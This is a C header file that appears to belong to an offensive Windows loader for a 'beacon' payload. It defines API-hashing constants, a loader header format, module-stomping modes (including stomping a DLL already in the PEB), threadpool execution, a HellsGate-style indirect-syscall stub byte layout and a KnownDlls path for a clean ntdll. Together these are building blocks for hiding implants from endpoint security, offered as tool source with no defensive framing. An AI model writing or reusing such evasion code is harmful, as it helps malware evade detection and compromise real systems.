#ifndef NAX_ADV_DEFS_H
#define NAX_ADV_DEFS_H

#include <windows.h>

typedef struct _BUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, *PBUFFER;

//
// Hashing (FNV1a, case-insensitive)
//
#define H_MAGIC_KEY       0x811c9dc5
#define H_MAGIC_PRIME     0x01000193
#define H_MODULE_NTDLL    0x318a7963
#define H_MODULE_KERNEL32 0x04a1a06a
#define H_MODULE_KERNELBASE 0xe9914f7a

//
// NaxHeader v2 (compatible with original NaX)
//
#define NAX_HDR_MAGIC     0x4E415832
#define NAX_HDR_SIZE      160
#define NAX_HDR_DLL_MAX   64

#define NAX_FLAG_MODULE_STOMP  0x0001
#define NAX_FLAG_STOMP_PDATA   0x0002

#define NAX_HDR_OFF_MAGIC       0
#define NAX_HDR_OFF_BEACON_SZ   4
#define NAX_HDR_OFF_PDATA_SZ    8
#define NAX_HDR_OFF_XDATA_SZ    12
#define NAX_HDR_OFF_TEXT_RVA    16
#define NAX_HDR_OFF_FLAGS       20
#define NAX_HDR_OFF_DLL_NAME   24
#define NAX_HDR_OFF_RESERVED   152

#define NAX_STOMP_CTX_MAGIC  0x4E415854

//
// Technique selection
//
#define NAX_STOMP_VIRTUAL         0
#define NAX_STOMP_MODULE          1
#define NAX_STOMP_ALREADYLOADED   2   // new: stomp a DLL already in PEB

#define NAX_EXEC_THREAD      0
#define NAX_EXEC_THREADPOOL  1

#ifndef NAX_STOMP_MODE
#define NAX_STOMP_MODE  NAX_STOMP_ALREADYLOADED
#endif

#ifndef NAX_EXEC_MODE
#define NAX_EXEC_MODE   NAX_EXEC_THREADPOOL
#endif

//
// Indirect syscall constants
//
#define NAX_SC_MAX              16
#define NAX_SC_SSN_INVALID      0xFFFFFFFF

// Nt stub prologue bytes used by HellsGate
//   mov r10, rcx
//   mov eax, SSN
#define NAX_NT_PROLOGUE_0       0x4c
#define NAX_NT_PROLOGUE_1       0x8b
#define NAX_NT_PROLOGUE_2       0xd1
#define NAX_NT_PROLOGUE_3       0xb8
#define NAX_NT_OFF_SSN          4

// Indirect syscall stub layout (28 bytes):
//   0:  4c 8b d1                mov r10, rcx
//   3:  b8 xx xx xx xx          mov eax, ssn
//   8:  49 bb gg gg gg gg gg gg gg gg  mov r11, gadget (10 bytes)
//  18:  41 ff d3                call r11
//  1b:  c3                      ret
//  1c:  (padding to 0x20)
#define NAX_SC_STUB_SIZE        0x20
#define NAX_SC_OFF_SSN          4
#define NAX_SC_OFF_GADGET       9

#define NAX_SC_GADGET_BYTE0     0x0f
#define NAX_SC_GADGET_BYTE1     0x05
#define NAX_SC_GADGET_BYTE2     0xc3     // syscall; ret

//
// KnownDlls section name for clean ntdll mapping (wide string as bytes)
// L"\\KnownDlls\\ntdll.dll"
//
#define NAX_KNOWN_DLLS_NTDLL_W  L"\\KnownDlls\\ntdll.dll"

#endif // NAX_ADV_DEFS_H
